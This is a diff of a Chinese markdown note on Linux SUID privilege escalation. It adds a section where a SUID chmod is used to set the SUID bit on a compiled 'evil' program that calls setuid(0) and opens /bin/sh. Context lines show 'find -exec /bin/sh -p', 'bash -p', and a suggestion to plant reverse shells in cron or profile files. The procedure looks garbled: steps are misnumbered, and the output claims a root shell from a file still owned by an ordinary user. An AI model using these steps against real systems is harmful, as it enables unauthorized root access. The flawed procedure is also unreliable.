@@ -41,7 +41,63 @@ find . -exec /bin/sh -p \; -quit
 利用命令：
 bash -p
 
-五：tar
+五：chmod 等文件权限修改程序拥有suid权限：
+很可怕，普通用户也能给恶意程序打上suid标签
+## 原理
+
+任何能以 root 身份调用 `chmod()`、`chown()` 等系统接口的程序，如果它允许普通用户对自己指定的文件路径执行权限或属主修改，就可能被用来给恶意程序打上 SUID 位。攻击流程通常是：
+
+1. 用户先在可写目录下创建一个恶意可执行文件（如跳转到 `/bin/sh` 的小程序）。
+2. 利用 SUID 程序，以 root 身份对该文件执行 `chmod +s`，将其变成 SUID root。
+3. 运行该恶意程序，就以 root 身份执行，拿到 shell。
+
+---
+### 1. 编写恶意程序
+
+```bash
+cat > evil.c << 'EOF'
+#include <unistd.h>
+int main() {
+    setuid(0);
+    setgid(0);
+    execl("/bin/sh", "sh", NULL);
+    return 0;
+}
+EOF
+
+gcc evil.c -o evil
+chmod 755 evil
+```
+
+`evil` 会在被设置 SUID 后，执行时切换到 root，并启动一个 shell。
+
+---
+
+### 3. 利用 SUID chmod 打 SUID
+
+```bash
+# 普通用户执行以下命令
+/tmp/chmod +s ./evil
+```
+
+此时 `evil` 就具有 SUID 位：
+
+```bash
+$ ls -l evil
+-rwsr-xr-x 1 youruser yourgroup  22K May  8 12:00 evil
+```
+
+---
+
+### 4. 执行恶意程序，获取 root
+
+```bash
+$ ./evil
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+七：tar
 
 1. 前提条件
 
@@ -99,7 +155,7 @@ tar cf "$TF.tar" "$TF"
     gtfobins.github.io
 
 
-六：其他可执行文件的一般suid二进制文件
+####其他可执行文件的一般suid二进制文件利用方式：
 
 若 SUID 程序能写入 /etc/cron.d/、/etc/profile.d/、~/.bashrc 等文件，就可插入反弹 shell 或定时任务
 
